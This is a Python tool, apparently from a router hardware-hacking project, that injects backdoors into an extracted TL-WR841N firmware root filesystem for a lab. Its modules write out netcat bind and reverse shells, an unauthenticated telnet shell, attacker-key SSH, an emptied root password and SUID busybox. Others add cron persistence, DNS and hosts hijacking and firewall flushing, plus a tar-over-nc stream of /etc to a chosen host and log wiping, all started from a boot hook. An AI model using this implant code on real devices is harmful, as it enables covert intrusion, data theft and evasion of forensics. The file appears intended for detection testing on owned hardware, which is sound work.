#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-3.0-or-later
# Copyright (C) 2022 Adam Henault
#
# This file is part of the TL-WR841N hardware-hacking project.
# This program is free software: you can redistribute it and/or modify it
# under the terms of the GNU General Public License as published by the Free
# Software Foundation, either version 3 of the License, or (at your option)
# any later version. See the LICENSE file at the root of the repository.
"""vuln - deliberately introduce vulnerabilities into the extracted rootfs.

Lab tool: weakens the rootfs unpacked by `fwtool.py extract`
(`extracted/squashfs-root`) so the reflashed device can be used to test
detection, demonstrate firmware persistence, etc. Run it on hardware you own.

Every change is idempotent and revertible with `clean`:
  - original files are backed up to `extracted/.vuln-backups/` before editing,
  - the boot hook is delimited by `# >>> fwvuln hook` comment markers,
  - the full injection set is tracked in `extracted/vuln_state.json`.

Workflow:
    python3 fwtool.py extract
    python3 vuln.py inject netcat nc-bind
    python3 fwtool.py build

Usage:
    vuln.py list                     show what this rootfs supports
    vuln.py inject <vuln...> [--all] apply vulnerabilities (idempotent)
    vuln.py clean                    revert everything vuln.py changed
    vuln.py report                   describe the currently injected set

Available vulnerabilities:
    netcat            install a static MIPS-BE nc (payloads/nc.mips), or
                      expose the busybox nc applet as /bin/nc when present
    nc-bind           boot-time bind shell on TCP/--port, respawned in a loop
    nc-reverse        boot-time reverse shell to --host:--port
    telnetd           unauthenticated busybox telnetd -l /bin/sh on TCP/23
    dropbear          SSH server on TCP/22 trusting /root/.ssh/authorized_keys
    passwordless-root empty the root password hash in /etc/shadow
    suid-busybox      set the SUID root bit on /bin/busybox
    cron-persistence  re-launch the services every minute via busybox crond
    dns-hijack        point /etc/resolv.conf at --ns at boot
    hosts-redirect    pin --domain to --ip in /etc/hosts at boot
    firewall-off      flush iptables and accept everything at boot
    open-proxy        HTTP CONNECT proxy on TCP/8888 (LAN pivot)
    exfil-config      stream /etc to --host:--port at boot (tar over nc)
    logwipe           truncate /var/log (and dmesg) at boot
"""
from __future__ import annotations

import argparse
import ipaddress
import json
import os
import re
import shutil
import sys
from dataclasses import dataclass, field
from pathlib import Path
from typing import Callable, Optional

HERE = Path(__file__).resolve().parent
PAYLOADS = HERE / "payloads"

ROOTFS_DIR = "squashfs-root"
STATE_FILE = "vuln_state.json"
BACKUP_DIR = ".vuln-backups"

RUNNER = "etc/fwvuln.sh"           # generated service script (in-rootfs path)
HOOK_BEGIN = "# >>> fwvuln hook >>>"
HOOK_END = "# <<< fwvuln hook <<<"
HOOK_BLOCK = (
    "\n" + HOOK_BEGIN + "\n"
    "[ -x /etc/fwvuln.sh ] && /etc/fwvuln.sh &\n"
    + HOOK_END + "\n"
)
INITTAB_RESPAWN = "::respawn:/etc/fwvuln.sh"

DEFAULT_PORT = 4444

S99_SCRIPT = "etc/init.d/S99fwvuln"

CRON_BEGIN = "# >>> fwvuln cron >>>"
CRON_END = "# <<< fwvuln cron <<<"
CRON_STARTER = "etc/fwvuln.cron"


class FwError(Exception):
    """User-facing error: bad input, missing file, rootfs not compatible."""


# --------------------------------------------------------------------------- #
# Reporting
# --------------------------------------------------------------------------- #


class Reporter:
    def log(self, msg: str, level: str = "info") -> None:
        prefix = {"info": "[*]", "ok": "[+]", "warn": "[!]", "error": "[x]", "cmd": "   "}
        print(f"{prefix.get(level, '[*]')} {msg}")


def check_platform() -> None:
    if not sys.platform.startswith("linux"):
        raise FwError(
            f"vuln must run on Linux (POSIX symlinks/permissions), detected: {sys.platform}. "
            "On Windows, run it from WSL: `wsl` then `cd /mnt/c/...` (see README)."
        )


# --------------------------------------------------------------------------- #
# State / backups
# --------------------------------------------------------------------------- #


@dataclass
class Ctx:
    rootfs: Path
    out: Path                  # extracted/ (state file, backups)
    rep: Reporter
    port: int = DEFAULT_PORT
    host: Optional[str] = None
    ns: Optional[str] = None               # dns-hijack nameserver
    redirect_ip: Optional[str] = None      # hosts-redirect target address
    redirect_domain: Optional[str] = None  # hosts-redirect domain
    pubkey: Optional[str] = None           # dropbear authorized_keys source
    root_hash: str = ""        # replacement hash for passwordless-root ("" = none)
    state: dict = field(default_factory=dict)

    # -- state -------------------------------------------------------------- #

    def save(self) -> None:
        self.out.mkdir(parents=True, exist_ok=True)
        (self.out / STATE_FILE).write_text(json.dumps(self.state, indent=2) + "\n")

    def created(self, rel: str) -> None:
        if rel not in self.state["created"]:
            self.state["created"].append(rel)

    def modified(self, rel: str) -> None:
        if rel not in self.state["modified"]:
            self.state["modified"].append(rel)

    # -- files -------------------------------------------------------------- #

    def backup(self, rel: str) -> None:
        """Keep one pristine copy of a rootfs file before the first edit."""
        dest = self.out / BACKUP_DIR / rel
        if dest.is_file():
            return
        dest.parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(self.rootfs / rel, dest)

    def restore(self, rel: str) -> bool:
        src = self.out / BACKUP_DIR / rel
        if not src.is_file():
            return False
        dest = self.rootfs / rel
        dest.parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(src, dest)
        return True

    # -- paths -------------------------------------------------------------- #

    def rel(self, path: Path) -> str:
        return path.relative_to(self.rootfs).as_posix()

    def abs_in_rootfs(self, path: Path) -> str:
        return "/" + self.rel(path)


def load_ctx(args: argparse.Namespace, rep: Reporter) -> Ctx:
    out = Path(args.dir) / "extracted"
    rootfs = out / ROOTFS_DIR
    if not rootfs.is_dir():
        raise FwError(
            f"{ROOTFS_DIR}/ not found under {out} (run `python3 fwtool.py extract` first)"
        )
    state_file = out / STATE_FILE
    state = json.loads(state_file.read_text()) if state_file.is_file() else {}
    for key in ("modules", "created", "modified", "services"):
        state.setdefault(key, [])
    return Ctx(
        rootfs=rootfs, out=out, rep=rep, state=state,
        port=validate_port(getattr(args, "port", DEFAULT_PORT)),
        host=getattr(args, "host", None),
        ns=getattr(args, "ns", None),
        redirect_ip=getattr(args, "ip", None),
        redirect_domain=getattr(args, "domain", None),
        pubkey=getattr(args, "pubkey", None),
        root_hash=getattr(args, "root_hash", ""),
    )


def validate_port(port: int) -> int:
    if not 1 <= port <= 65535:
        raise FwError(f"--port must be 1-65535, got {port}")
    return port


# --------------------------------------------------------------------------- #
# Rootfs inspection helpers
# --------------------------------------------------------------------------- #

# BusyBox stores its applet names as one NUL-separated blob, uncompressed even
# when usage strings are; matching "\x00nc\x00" therefore detects an applet.
def has_applet(data: bytes, name: str) -> bool:
    return re.search(rb"(?:\x00|\A)" + re.escape(name.encode()) + rb"\x00", data) is not None


def find_busybox(ctx: Ctx) -> Optional[Path]:
    for path in sorted(ctx.rootfs.rglob("busybox*")):
        if not path.is_file():
            continue
        try:
            data = path.read_bytes()
        except OSError:
            continue
        if b"BusyBox" in data[:65536] or has_applet(data, "sh"):
            return path
    return None


def find_binary(ctx: Ctx, name: str) -> Optional[Path]:
    """Locate a regular file/symlink named exactly `name` in the rootfs."""
    for path in sorted(ctx.rootfs.rglob(name)):
        if path.is_file():
            return path
    return None


def require_ipv4(value: Optional[str], module: str, flag: str = "--host") -> str:
    if not value:
        raise FwError(f"{module} needs an address: pass {flag} IPv4")
    try:
        ipaddress.IPv4Address(value)
    except ValueError as exc:
        raise FwError(
            f"{module}: {flag} must be a dotted IPv4 address "
            f"(boot-time resolver is unreliable): {value}"
        ) from exc
    return value


def find_init_script(ctx: Ctx) -> tuple[Optional[Path], str]:
    """Locate the boot script the hook should go into, and how to hook it.

    Returns (path, kind) with kind in {"rcs", "s99", "inittab", "new-rcs"}.
    """
    rootfs = ctx.rootfs
    inittab = rootfs / "etc" / "inittab"

    # 1. BusyBox init: the script ::sysinit: runs at boot.
    if inittab.is_file():
        for line in inittab.read_text(errors="replace").splitlines():
            fields = line.split(":")
            if len(fields) >= 4 and fields[2] == "sysinit":
                script = rootfs / fields[3].lstrip("/")
                if script.is_file():
                    return script, "rcs"

    # 2. SysV-style: an explicit rcS, or S?? scripts to slot into.
    initd = rootfs / "etc" / "init.d"
    if initd.is_dir():
        rcS = initd / "rcS"
        if rcS.is_file():
            return rcS, "rcs"
        if any(re.fullmatch(r"S\d{2}.*", p.name) for p in initd.iterdir()):
            return initd / "S99fwvuln", "s99"

    # 3. inittab without a usable sysinit: respawn our runner from init.
    if inittab.is_file():
        return inittab, "inittab"

    # 4. Nothing: create rcS, which BusyBox init runs by default anyway.
    return rootfs / "etc" / "init.d" / "rcS", "new-rcs"


# --------------------------------------------------------------------------- #
# Vulnerability modules
# --------------------------------------------------------------------------- #


def require_netcat(ctx: Ctx) -> str:
    """Return the nc command line to use inside the rootfs, installing it if needed."""
    if "netcat" not in ctx.state["modules"]:
        ctx.rep.log("dependency: installing netcat first", "info")
        detail = VULNS["netcat"][1](ctx)
        ctx.state["modules"].append("netcat")
        ctx.state.setdefault("details", {})["netcat"] = detail
    if (ctx.rootfs / "usr" / "bin" / "nc").exists():
        return "/usr/bin/nc"
    bb = find_busybox(ctx)
    if bb is not None and has_applet(bb.read_bytes(), "nc"):
        return f"{ctx.abs_in_rootfs(bb)} nc"
    raise FwError("netcat was not installed although required (re-run inject netcat)")


def add_service(ctx: Ctx, vid: str, lines: list[str]) -> None:
    for entry in ctx.state["services"]:
        if entry["id"] == vid:
            entry["lines"] = lines
            break
    else:
        ctx.state["services"].append({"id": vid, "lines": lines})


def v_netcat(ctx: Ctx) -> str:
    bb = find_busybox(ctx)
    if bb is not None and has_applet(bb.read_bytes(), "nc"):
        link = ctx.rootfs / "bin" / "nc"
        if not link.exists() and not link.is_symlink():
            os.symlink("busybox", link)
            ctx.created(ctx.rel(link))
            return "busybox nc applet exposed as /bin/nc"
        return "busybox nc applet already exposed as /bin/nc"

    payload = PAYLOADS / "nc.mips"
    if not payload.is_file():
        raise FwError(
            "no busybox nc applet in this rootfs and payloads/nc.mips is missing. "
            "Build it once on Linux/WSL: see tools/payloads/README.md "
            "(cross-compile with a mips-linux-muslsf toolchain)."
        )
    dest = ctx.rootfs / "usr" / "bin" / "nc"
    dest.parent.mkdir(parents=True, exist_ok=True)
    dest.write_bytes(payload.read_bytes())
    os.chmod(dest, 0o755)
    ctx.created(ctx.rel(dest))
    return "static /usr/bin/nc installed from payloads/nc.mips (MIPS big-endian)"


def v_nc_bind(ctx: Ctx) -> str:
    nc = require_netcat(ctx)
    add_service(ctx, "nc-bind",
                [f"while :; do {nc} -l -p {ctx.port} -e /bin/sh; sleep 1; done &"])
    return f"bind shell on TCP/{ctx.port} at boot (auto-respawn loop)"


def v_nc_reverse(ctx: Ctx) -> str:
    nc = require_netcat(ctx)
    host = require_ipv4(ctx.host, "nc-reverse")
    add_service(ctx, "nc-reverse",
                [f"while :; do {nc} {host} {ctx.port} -e /bin/sh; sleep 10; done &"])
    return f"reverse shell to {host}:{ctx.port} at boot (auto-respawn loop)"


def v_telnetd(ctx: Ctx) -> str:
    bb = find_busybox(ctx)
    if bb is None or not has_applet(bb.read_bytes(), "telnetd"):
        raise FwError("no busybox with a telnetd applet found in this rootfs")
    add_service(ctx, "telnetd", [f"{ctx.abs_in_rootfs(bb)} telnetd -l /bin/sh"])
    return "unauthenticated telnet shell on TCP/23 (busybox telnetd -l /bin/sh)"


def v_passwordless_root(ctx: Ctx) -> str:
    target = None
    for rel in ("etc/shadow", "etc/passwd"):
        if (ctx.rootfs / rel).is_file():
            target = rel
            break
    if target is None:
        raise FwError("no /etc/shadow or /etc/passwd in the rootfs (web-ui credentials live elsewhere)")

    ctx.backup(target)
    path = ctx.rootfs / target
    out_lines = []
    changed = False
    for line in path.read_bytes().splitlines(keepends=True):
        stripped = line.rstrip(b"\r\n")
        fields = stripped.split(b":")
        if fields and fields[0] == b"root" and len(fields) >= 2:
            fields[1] = ctx.root_hash.encode()
            newline = line[len(stripped):]          # keep original line ending
            out_lines.append(b":".join(fields) + newline)
            changed = True
        else:
            out_lines.append(line)
    if not changed:
        raise FwError(f"no root entry found in /{target}")
    path.write_bytes(b"".join(out_lines))
    ctx.modified(target)
    where = "emptied" if ctx.root_hash == "" else "replaced"
    return f"root password hash {where} in /{target} ({ctx.root_hash or '<no password>'})"


def v_suid_busybox(ctx: Ctx) -> str:
    bb = find_busybox(ctx)
    if bb is None:
        raise FwError("no busybox found in this rootfs")
    rel = ctx.rel(bb)
    ctx.backup(rel)
    os.chmod(bb, 0o4755)
    ctx.modified(rel)
    return "SUID root bit set on busybox (any local process can spawn a root shell)"


def v_cron_persistence(ctx: Ctx) -> str:
    bb = find_busybox(ctx)
    if bb is None or not has_applet(bb.read_bytes(), "crond"):
        raise FwError("no busybox with a crond applet found in this rootfs")
    starter = ctx.rootfs / CRON_STARTER
    if not starter.exists():
        starter.parent.mkdir(parents=True, exist_ok=True)
        starter.write_text(
            "#!/bin/sh\n"
            "# Generated by vuln.py - cron-based re-launch of the fwvuln services.\n"
            "[ -e /tmp/.fwvuln-running ] && exit 0\n"
            "touch /tmp/.fwvuln-running\n"
            "/etc/fwvuln.sh &\n"
        )
        os.chmod(starter, 0o755)
        ctx.created(ctx.rel(starter))
    crontab = ctx.rootfs / "etc" / "crontabs" / "root"
    cron_line = f"* * * * * /{CRON_STARTER}"
    if crontab.is_file():
        ctx.backup(ctx.rel(crontab))
        ctx.modified(ctx.rel(crontab))
        data = crontab.read_bytes()
        if CRON_BEGIN.encode() not in data:
            if not data.endswith(b"\n"):
                data += b"\n"
            crontab.write_bytes(data + f"\n{CRON_BEGIN}\n{cron_line}\n{CRON_END}\n".encode())
    else:
        crontab.parent.mkdir(parents=True, exist_ok=True)
        crontab.write_bytes(f"{CRON_BEGIN}\n{cron_line}\n{CRON_END}\n".encode())
        ctx.created(ctx.rel(crontab))
    add_service(ctx, "cron-persistence", [f"{ctx.abs_in_rootfs(bb)} crond -b -c /etc/crontabs"])
    return "services re-launched every minute by busybox crond (second persistence vector)"


def v_dns_hijack(ctx: Ctx) -> str:
    ns = require_ipv4(ctx.ns, "dns-hijack", "--ns")
    add_service(ctx, "dns-hijack", [f'echo "nameserver {ns}" > /etc/resolv.conf'])
    return f"/etc/resolv.conf overwritten with nameserver {ns} at boot"


def v_hosts_redirect(ctx: Ctx) -> str:
    ip = require_ipv4(ctx.redirect_ip, "hosts-redirect", "--ip")
    domain = ctx.redirect_domain
    if not domain or "." not in domain or not re.fullmatch(r"[A-Za-z0-9.-]+", domain):
        raise FwError("hosts-redirect needs a domain name: --domain example.com")
    add_service(ctx, "hosts-redirect", [f'echo "{ip} {domain}" >> /etc/hosts'])
    return f"{domain} pinned to {ip} in /etc/hosts at boot"


def v_firewall_off(ctx: Ctx) -> str:
    ipt = find_binary(ctx, "iptables")
    if ipt is None:
        raise FwError("no iptables binary in this rootfs (firewall-off not applicable)")
    iptables = ctx.abs_in_rootfs(ipt)
    add_service(ctx, "firewall-off", [
        f"{iptables} -P INPUT ACCEPT",
        f"{iptables} -P FORWARD ACCEPT",
        f"{iptables} -P OUTPUT ACCEPT",
        f"{iptables} -F",
        f"{iptables} -t nat -F",
        f"{iptables} -t mangle -F",
    ])
    return "iptables flushed, all policies ACCEPT at boot"


def v_dropbear(ctx: Ctx) -> str:
    payload = PAYLOADS / "dropbear.mips"
    keytool = PAYLOADS / "dropbearkey.mips"
    for p in (payload, keytool):
        if not p.is_file():
            raise FwError(
                f"{p.name} is missing - build it with tools/payloads/build_dropbear.sh "
                "(see payloads/README.md)"
            )
    if not ctx.pubkey:
        raise FwError("dropbear needs the attacker public key: --pubkey PATH (e.g. ~/.ssh/id_ed25519.pub)")
    try:
        pubkey = Path(ctx.pubkey).read_bytes()
    except OSError as exc:
        raise FwError(f"cannot read --pubkey {ctx.pubkey}: {exc}") from exc
    if b"ssh-" not in pubkey and b"ecdsa-" not in pubkey:
        raise FwError(f"{ctx.pubkey} does not look like an OpenSSH public key")
    sbin = ctx.rootfs / "usr" / "sbin"
    sbin.mkdir(parents=True, exist_ok=True)
    for src, name in ((payload, "dropbear"), (keytool, "dropbearkey")):
        dest = sbin / name
        dest.write_bytes(src.read_bytes())
        os.chmod(dest, 0o755)
        ctx.created(ctx.rel(dest))
    sshdir = ctx.rootfs / "root" / ".ssh"
    sshdir.mkdir(parents=True, exist_ok=True)
    authkeys = sshdir / "authorized_keys"
    if not authkeys.exists():
        authkeys.write_bytes(pubkey if pubkey.endswith(b"\n") else pubkey + b"\n")
        os.chmod(authkeys, 0o600)
        ctx.created(ctx.rel(authkeys))
    add_service(ctx, "dropbear", [
        "/usr/sbin/dropbearkey -t rsa -f /tmp/fwvuln_host_key -s 2048 >/dev/null 2>&1",
        "/usr/sbin/dropbear -r /tmp/fwvuln_host_key -p 22",
    ])
    return "SSH server on TCP/22 trusting /root/.ssh/authorized_keys (host key regenerated in /tmp)"


def v_open_proxy(ctx: Ctx) -> str:
    payload = PAYLOADS / "proxy.mips"
    if not payload.is_file():
        raise FwError("proxy.mips is missing - build it with tools/payloads/build.sh (see payloads/README.md)")
    dest = ctx.rootfs / "usr" / "bin" / "proxy"
    dest.parent.mkdir(parents=True, exist_ok=True)
    dest.write_bytes(payload.read_bytes())
    os.chmod(dest, 0o755)
    ctx.created(ctx.rel(dest))
    add_service(ctx, "open-proxy", ["/usr/bin/proxy -p 8888"])
    return "HTTP CONNECT proxy on TCP/8888 (LAN pivot / egress relay)"


def v_exfil_config(ctx: Ctx) -> str:
    host = require_ipv4(ctx.host, "exfil-config")
    nc = require_netcat(ctx)
    add_service(ctx, "exfil-config",
                [f"( sleep 5; tar -C / -cf - etc 2>/dev/null | {nc} {host} {ctx.port} ) &"])
    return f"/etc streamed to {host}:{ctx.port} at boot (tar over nc)"


def v_logwipe(ctx: Ctx) -> str:
    lines = ['for f in /var/log/*; do : > "$f"; done 2>/dev/null']
    bb = find_busybox(ctx)
    if bb is not None and has_applet(bb.read_bytes(), "dmesg"):
        lines.append(f"{ctx.abs_in_rootfs(bb)} dmesg -c >/dev/null 2>&1")
    add_service(ctx, "logwipe", lines)
    return "/var/log truncated (and kernel ring buffer cleared) at boot"


# (id, one-line description, apply function)
VULNS: dict[str, tuple[str, Callable[[Ctx], str]]] = {
    # access / backdoors
    "netcat": ("install a static MIPS-BE nc (or expose the busybox nc applet)", v_netcat),
    "nc-bind": ("boot-time bind shell on TCP/--port", v_nc_bind),
    "nc-reverse": ("boot-time reverse shell to --host:--port", v_nc_reverse),
    "telnetd": ("unauthenticated busybox telnetd on TCP/23", v_telnetd),
    "dropbear": ("SSH server on TCP/22 with an attacker-controlled key", v_dropbear),
    "passwordless-root": ("empty the root password hash in /etc/shadow", v_passwordless_root),
    "suid-busybox": ("set the SUID root bit on busybox", v_suid_busybox),
    # persistence
    "cron-persistence": ("re-launch the services every minute via busybox crond", v_cron_persistence),
    # network-facing
    "dns-hijack": ("point /etc/resolv.conf at --ns at boot", v_dns_hijack),
    "hosts-redirect": ("pin --domain to --ip in /etc/hosts at boot", v_hosts_redirect),
    "firewall-off": ("flush iptables and accept everything at boot", v_firewall_off),
    "open-proxy": ("HTTP CONNECT proxy on TCP/8888 (LAN pivot)", v_open_proxy),
    # exfiltration / anti-forensics
    "exfil-config": ("stream /etc to --host:--port at boot (tar over nc)", v_exfil_config),
    "logwipe": ("truncate /var/log and clear dmesg at boot", v_logwipe),
}


# --------------------------------------------------------------------------- #
# Boot hook + runner generation
# --------------------------------------------------------------------------- #


def write_runner(ctx: Ctx) -> None:
    """(Re)generate /etc/fwvuln.sh with one line per enabled service.

    Ends with `wait` so the runner stays in the foreground: backgrounded from
    the rcS hook, or respawned by init if it ever dies.
    """
    runner = ctx.rootfs / RUNNER
    lines = [line for entry in ctx.state["services"] for line in entry["lines"]]
    body = (
        "#!/bin/sh\n"
        "# Generated by vuln.py - introduced lab vulnerabilities. Run `vuln.py clean` to revert.\n"
        "touch /tmp/.fwvuln-running\n"
        + ("\n".join(lines) + "\n" if lines else "")
        + "wait\n"
    )
    if not runner.exists():
        runner.parent.mkdir(parents=True, exist_ok=True)
        ctx.created(ctx.rel(runner))
    runner.write_text(body)
    os.chmod(runner, 0o755)


def hook_init(ctx: Ctx) -> None:
    if ctx.state.get("hooked"):
        return
    script, kind = find_init_script(ctx)
    rel = ctx.rel(script)

    if kind in ("rcs", "new-rcs"):
        if kind == "new-rcs":
            script.parent.mkdir(parents=True, exist_ok=True)
            script.write_bytes(b"#!/bin/sh\n")
            ctx.created(rel)
        else:
            ctx.backup(rel)
            ctx.modified(rel)
        data = script.read_bytes()
        if HOOK_BEGIN.encode() in data:
            ctx.rep.log(f"hook already present in /{rel}", "warn")
        else:
            script.write_bytes(insert_hook(data))
        os.chmod(script, 0o755)
        ctx.rep.log(f"boot hook added to /{rel} (before exit / blocking tail if any)", "ok")

    elif kind == "s99":
        script.parent.mkdir(parents=True, exist_ok=True)
        script.write_bytes(
            b"#!/bin/sh\n" + HOOK_BEGIN.encode() + b"\n"
            b"/etc/fwvuln.sh &\n" + HOOK_END.encode() + b"\n"
        )
        os.chmod(script, 0o755)
        ctx.created(rel)
        ctx.rep.log(f"created /{rel} (S??-style boot script)", "ok")

    elif kind == "inittab":
        ctx.backup(rel)
        ctx.modified(rel)
        data = script.read_bytes()
        if INITTAB_RESPAWN.encode() in data:
            ctx.rep.log(f"respawn entry already present in /{rel}", "warn")
        else:
            if not data.endswith(b"\n"):
                data += b"\n"
            data += (HOOK_BEGIN + "\n" + INITTAB_RESPAWN + "\n" + HOOK_END + "\n").encode()
            script.write_bytes(data)
        ctx.rep.log(f"init respawns /etc/fwvuln.sh via /{rel}", "ok")

    ctx.state["hooked"] = ctx.rel(script)


def insert_hook(data: bytes) -> bytes:
    """Append the hook, but before a trailing `exit` or a blocking last command."""
    lines = data.splitlines(keepends=True)
    last_cmd = None
    for i in range(len(lines) - 1, -1, -1):
        text = lines[i].strip()
        if not text or text.startswith(b"#"):
            continue
        last_cmd = i
        break
    if last_cmd is not None:
        text = lines[last_cmd].strip()
        if text.startswith(b"exit"):
            return b"".join(lines[:last_cmd]) + HOOK_BLOCK.encode() + b"".join(lines[last_cmd:])
        if not text.endswith(b"&") and not text.endswith(b";&"):
            ctx_block = HOOK_BLOCK.encode()
            return b"".join(lines[:last_cmd]) + ctx_block + b"".join(lines[last_cmd:])
    return data + HOOK_BLOCK.encode()


# --------------------------------------------------------------------------- #
# Commands
# --------------------------------------------------------------------------- #


def inject(ctx: Ctx, ids: list[str]) -> None:
    for vid in ids:
        desc, apply_fn = VULNS[vid]
        if vid in ctx.state["modules"]:
            detail = ctx.state.get("details", {}).get(vid, "")
            ctx.rep.log(f"{vid}: already injected ({detail})", "warn")
            continue
        detail = apply_fn(ctx)
        ctx.state["modules"].append(vid)
        ctx.state.setdefault("details", {})[vid] = detail
        ctx.rep.log(f"{vid}: {detail}", "ok")

    if ctx.state["services"]:
        write_runner(ctx)
        hook_init(ctx)
    ctx.save()
    if ctx.state["modules"]:
        ctx.rep.log("next step: `python3 fwtool.py build`", "info")


def clean(ctx: Ctx) -> None:
    if not ctx.state["modules"] and not ctx.state["created"]:
        ctx.rep.log("nothing to clean (no state file or empty state)", "info")
        return
    for rel in ctx.state["modified"]:
        if ctx.restore(rel):
            ctx.rep.log(f"restored /{rel}", "ok")
        else:
            ctx.rep.log(f"no backup for /{rel}, stripping markers instead", "warn")
    for rel in ctx.state["created"]:
        path = ctx.rootfs / rel
        if path.is_symlink() or path.is_file():
            path.unlink()
            ctx.rep.log(f"removed /{rel}", "ok")
        # prune parent directories the injection created (usr/sbin, root/.ssh, ...)
        parent = path.parent
        while parent != ctx.rootfs:
            try:
                parent.rmdir()  # only succeeds when empty
            except OSError:
                break
            ctx.rep.log(f"pruned empty dir /{ctx.rel(parent)}", "info")
            parent = parent.parent
    # Fallback: strip any fwvuln marker block left anywhere under etc/.
    for path in (ctx.rootfs / "etc").rglob("*") if (ctx.rootfs / "etc").is_dir() else ():
        if path.is_file():
            data = path.read_bytes()
            if b"# >>> fwvuln" in data:
                path.write_bytes(strip_markers(data))
                ctx.rep.log(f"stripped injected block from /{ctx.rel(path)}", "ok")
    runner = ctx.rootfs / RUNNER
    if runner.exists():
        runner.unlink()
        ctx.rep.log(f"removed /{RUNNER}", "ok")
    shutil.rmtree(ctx.out / BACKUP_DIR, ignore_errors=True)
    (ctx.out / STATE_FILE).unlink(missing_ok=True)
    ctx.rep.log("rootfs reverted to its post-extract state", "ok")


def strip_markers(data: bytes) -> bytes:
    """Remove every fwvuln marker-delimited block (hook and cron)."""
    out, inside = [], False
    for line in data.splitlines(keepends=True):
        stripped = line.strip()
        if stripped.startswith(b"# >>> fwvuln"):
            inside = True
            # drop the blank line the hook block left before its begin marker
            if out and not out[-1].strip():
                out.pop()
            continue
        if stripped.startswith(b"# <<< fwvuln"):
            inside = False
            continue
        if not inside:
            out.append(line)
    return b"".join(out)


def report(ctx: Ctx) -> None:
    if not ctx.state["modules"]:
        ctx.rep.log("nothing injected in this rootfs", "info")
        return
    ctx.rep.log(f"injected vulnerabilities (state: {ctx.out / STATE_FILE}):", "info")
    for vid in ctx.state["modules"]:
        print(f"  - {vid:<18} {ctx.state.get('details', {}).get(vid, '')}")
    hook = ctx.state.get("hooked")
    if hook:
        print(f"  boot hook: /{hook} -> /{RUNNER}")
    print(f"  services: {len(ctx.state['services'])}")


def show_list(ctx: Ctx) -> None:
    ctx.rep.log(f"rootfs: {ctx.rootfs}", "info")
    bb = find_busybox(ctx)
    if bb is not None:
        data = bb.read_bytes()
        ctx.rep.log(
            f"busybox: {ctx.abs_in_rootfs(bb)} "
            f"(nc applet: {'yes' if has_applet(data, 'nc') else 'NO'}, "
            f"telnetd applet: {'yes' if has_applet(data, 'telnetd') else 'NO'})"
        )
    else:
        ctx.rep.log("busybox: not found", "warn")
    payload = PAYLOADS / "nc.mips"
    ctx.rep.log(
        f"netcat payload: {payload} "
        + ("present" if payload.is_file() else "MISSING (see tools/payloads/README.md)")
    )
    script, kind = find_init_script(ctx)
    ctx.rep.log(f"boot mechanism: {kind} -> /{ctx.rel(script)}")
    for rel in ("etc/shadow", "etc/passwd"):
        if (ctx.rootfs / rel).is_file():
            ctx.rep.log(f"password file: /{rel} present")
    print()
    for vid, (desc, _fn) in VULNS.items():
        status = "injected" if vid in ctx.state["modules"] else "available"
        print(f"  {vid:<18} {status:<10} {desc}")


# --------------------------------------------------------------------------- #
# CLI
# --------------------------------------------------------------------------- #


def main(argv: Optional[list[str]] = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--dir", default=str(HERE), help="fwtool working directory (default: script directory)")

    sub = parser.add_subparsers(dest="command", required=True)

    p_list = sub.add_parser("list", help="show what this extracted rootfs supports")

    p_inject = sub.add_parser("inject", help="apply one or more vulnerabilities (idempotent)")
    p_inject.add_argument("vulns", nargs="*", choices=sorted(VULNS), metavar="vuln")
    p_inject.add_argument("--all", action="store_true", help="inject every applicable vulnerability")
    p_inject.add_argument("--port", type=int, default=DEFAULT_PORT,
                          help=f"TCP port for nc-bind / nc-reverse / exfil-config (default: {DEFAULT_PORT})")
    p_inject.add_argument("--host", default=None, help="listener/exfil IPv4 (nc-reverse, exfil-config)")
    p_inject.add_argument("--root-hash", default="", help="replacement root hash (default: empty = passwordless root)")
    p_inject.add_argument("--ns", default=None, help="nameserver IPv4 for dns-hijack")
    p_inject.add_argument("--ip", default=None, help="target IPv4 for hosts-redirect")
    p_inject.add_argument("--domain", default=None, help="domain to pin for hosts-redirect")
    p_inject.add_argument("--pubkey", default=None, help="OpenSSH public key file for dropbear")

    sub.add_parser("clean", help="revert everything vuln.py changed")
    sub.add_parser("report", help="describe the currently injected set")

    args = parser.parse_args(argv)
    rep = Reporter()
    try:
        ctx = load_ctx(args, rep)
        if args.command == "list":
            show_list(ctx)
        elif args.command == "report":
            report(ctx)
        elif args.command == "clean":
            check_platform()
            clean(ctx)
        elif args.command == "inject":
            check_platform()
            ids = sorted(VULNS) if args.all else args.vulns
            if not ids:
                parser.error("inject needs at least one vulnerability or --all")
            inject(ctx, ids)
    except FwError as exc:
        rep.log(str(exc), "error")
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
